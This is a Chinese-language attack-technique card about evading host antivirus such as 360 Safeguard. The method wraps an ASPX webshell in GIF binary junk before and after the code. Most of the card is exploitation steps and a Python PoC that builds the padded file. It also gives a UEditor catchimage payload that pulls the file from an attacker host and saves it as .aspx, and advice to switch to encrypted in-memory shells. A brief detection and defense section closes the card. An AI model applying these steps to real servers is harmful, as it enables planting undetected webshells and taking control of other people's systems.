---
id: web-generic-file-upload-image-junk-padding-both-side-av-bypass
title: 图片脏数据前后双向填充绕过主机杀软：只填一侧无效，前后都填后加密 ASP.NET 马落地执行
type: scenario
domain: web
path: web/generic/file-upload
technique: image-junk-padding-bidirectional-av-bypass
aliases:
- 图片脏数据免杀
- 前后填充绕过杀软
- 双向填充 webshell
- 360 静态查杀绕过
- 脏数据包裹 shell
tags:
- web
- file-upload
- av-bypass
- webshell
- aspx
- padding
- obfuscation
- 360
- iis
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V313
  verified_at: '2026-11-08T12:45:07+08:00'
  notes: 已对照原文与15张图核对：图07/08 显示换 shell 内容后抓取错误/落盘 404，图14/15 进程列表确认 ZhuDongFangYu.exe/360tray.exe（360 主动防御/实时保护）与 QQProtect.exe，图11/12 为图片二进制前后包裹的天蝎 RijndaelManaged+Assembly.Load 加密 ASPX 马，图13 天蝎命令行 whoami 成功；原文明确'只加前面或后面都没办法 bypass'，卡内双向填充结论一致。与既有 waf-junk-padding 卡（针对 WAF body 检测、<!*...*!> 标记）检测器/环境不同，dedup 为 related 非同一链；dup-scan 无本篇 pair。未验证点：原文未公开马的完整字节与目标地址，PoC 为按方法还原的最小构造，未复跑。
---

## 一句话结论

上传或远程抓取写入的 webshell 被主机杀软按内容查杀时，把大量图片二进制“脏数据”同时放在 shell 代码的前后（只放前面或只放后面都不行），可以让静态扫描无法命中完整特征，而 ASPX 只执行 `<% %>` 块、块外垃圾不影响运行；原文用该方式把天蝎加密 ASP.NET 马落到 360 防护的服务器上并成功执行命令。

## 原理

- **判定“是内容查杀而不是 WAF”**：原文在后缀绕过之后，抓取请求返回 SUCCESS 和落盘路径，但访问该路径 404，说明请求已经过了 WAF、文件也被写入了，随后被主机安全软件删除/隔离；原文在目标进程列表中确认存在 360 安全卫士（`ZhuDongFangYu.exe` 主动防御、`360tray.exe` 实时保护）与腾讯电脑管家（`QQProtect.exe`）。
- **静态查杀的盲区**：基于文件内容的 AV 检测依赖签名、片段匹配、扫描长度/窗口等启发式规则。在真正的 webshell 代码前后填充大量无害的图片二进制数据，会稀释恶意特征、把敏感片段推到扫描窗口之外或打断签名所需的连续上下文。
- **为什么必须前后都填**：只在前面填充只能骗过“只扫前 N 字节”的实现；只在后面填充只能骗过“只看文件尾部/整文件固定签名”的实现。原文实测只加前面或只加后面都被拦截，两侧同时大量填充后才通过，说明该检测综合了不同偏移/窗口的检查。
- **后端仍能执行**：ASPX 文件由编译器识别 `<% ... %>` 代码块，块外的任意文本/二进制不会阻止编译与执行；因此填充不影响 shell 功能。JSP/PHP 的块外内容同理。
- **载荷选择**：原文先用明文马、各种免杀马、蚁剑生成的短马均未能稳定落地/连接，最终使用天蝎生成的加密 ASP.NET 马。该马磁盘上只有解密 stub：从请求体读 Base64 密文，用 RijndaelManaged 解密，再 `Assembly.Load(data).CreateInstance("U")` 在内存加载真正的程序集，因此静态文件里没有明显的命令执行/请求处理特征，进一步降低查杀命中率；具体编译产物免杀见关联卡。
- **组合关系**：后缀层绕过（WAF）与内容层填充（杀软）是两个独立障碍，原文依次解决；缺任一步都会在请求重置或落盘后 404 处失败。

## 触发条件

- 已有一个能写入 Web 可执行目录的写入点（上传、远程抓取、任意文件写），且后缀层已经解决。
- 目标主机装有实时/主动防御类安全软件，会扫描新落盘文件并删除命中的 webshell（表现为响应 SUCCESS 但访问 404）。
- 安全软件的静态扫描存在长度上限、分窗口或可被大量良性内容稀释的签名匹配；上传/抓取接口允许较大的文件体积。
- 后端脚本语法允许恶意代码块外存在任意数据（ASPX/JSP/PHP 均满足）。

## 利用步骤

1. 先确认后缀绕过可用，并上传一个最小明文 shell；若响应成功但访问 404/文件消失，判定为内容层查杀。
2. 准备一张 GIF 图片，把其二进制内容复制成大量多行“脏数据”；把 shell 代码放在中间，前后各粘贴多行图片内容并反复扩充（原文用复制粘贴手工扩充）。
3. 将文件托管到攻击者 HTTP 服务（文件名保持无害，如 `1111.gif`），通过上传点或 catchimage 抓取写入目标，落盘时用后缀拆分手法得到 `.aspx`。
4. 抓取/上传返回 SUCCESS 后立即访问落盘路径；若仍 404，继续增加前后填充量、调整 shell 位置或更换填充内容。
5. 用 webshell 客户端连接（原文天蝎），执行 `whoami` 等命令验证；原文最终拿到命令执行结果。
6. 若杀软仍拦截，换用加密/内存加载型 shell（天蝎、冰蝎、哥斯拉的 ASPX 马）再叠加填充。

## PoC

```python
# 最小形态：图片脏数据 + shell + 图片脏数据
junk = open("cover.gif", "rb").read()          # 多行图片二进制
shell = b'<%@ Page Language="C#" %><% Response.Write("ok"); %>'
open("1111.gif", "wb").write(junk + b"\n" + shell + b"\n" + junk)
```

```text
# 通过 UEditor catchimage 抓取（后缀拆分见关联卡）：
source[]=http://attacker:8080/1111.gif?.a?s?p?x
# 落盘为 .aspx 后访问执行；原文最终载荷为天蝎生成的
# RijndaelManaged 解密 + Assembly.Load 加密 ASP.NET 马，而非上面这个明文 stub。
```

```text
# 原文判定结果：
# 只在前填充 -> 被拦截；只在后填充 -> 被拦截；
# 前后都填充 + 加密马 -> 访问成功、客户端命令执行成功。
```

无完整可复现 PoC：原文关键请求与目标地址打码，shell 内容为工具生成且未公开完整字节；上例为按原文方法还原的最小构造。

## 变体与关联

- 变体：填充内容可换成 PNG/JPEG 二进制、HTML 注释、随机字母、合法文件头；关键是“无害、量大、前后都有”。
- 变体：填充位置可先做前后对称，再按实际响应调整；若目标只扫前 N 字节，可只保留前填充。
- 关联：[[web-generic-file-upload-waf-junk-padding-aspx-content-bypass]]——同样是“垃圾内容包裹 ASPX”，但那张卡针对的是 WAF 的 body 内容检测（`<!*...*!>` 标记、约 300 段、配合重复 filename 前后缀绕过）；本卡针对主机杀软的文件静态查杀（图片二进制、前后双向、配合加密马），检测器与环境不同。
- 关联：[[web-generic-file-upload-encrypted-webshell-av-bypass]]（PHP 冰蝎加密马对抗内容查杀）、[[web-dotnet-aspnet-webshell-compiled-assembly-evasion]]（ASP.NET 编译产物查杀与 RijndaelManaged/Assembly.Load 反射免杀，可解释本卡天蝎马为何能过静态扫描）。
- 关联：[[web-generic-file-upload-question-mark-filename-sanitize-waf-aspx-bypass]]（本卡的前置后缀绕过）。
- 边界：若 AV 对完整文件做流式/全量扫描并对高熵或“脚本块被大段二进制包裹”的结构告警，填充可能无效；上传体积上限、AMSI/EDR 内存与行为检测也会让该手法失效。

## 检测与防御

- 检测：上传文件内容中出现“大段二进制/图片数据包裹脚本代码块”的结构；文件魔数与扩展名不一致；文件熵分布异常或大量重复填充。
- 检测：Web 目录新增 `.aspx` 后请求立即 404/文件消失（说明被查杀）又反复出现；w3wp 进程派生 cmd.exe/powershell 等子进程。
- 防御：上传目录禁止脚本执行、与 Web 根分离；保存时随机命名 + 扩展名白名单 + 图片解码/魔数校验。
- 防御：部署 AMSI 与 EDR 内存/行为检测，不只依赖文件静态特征；对 `Assembly.Load`、反射加载和加密请求 body 做审计。
- 加固：限制上传/抓取文件大小，禁止不必要的远程抓取功能；对上传文件先做隔离扫描再放入 Web 目录。
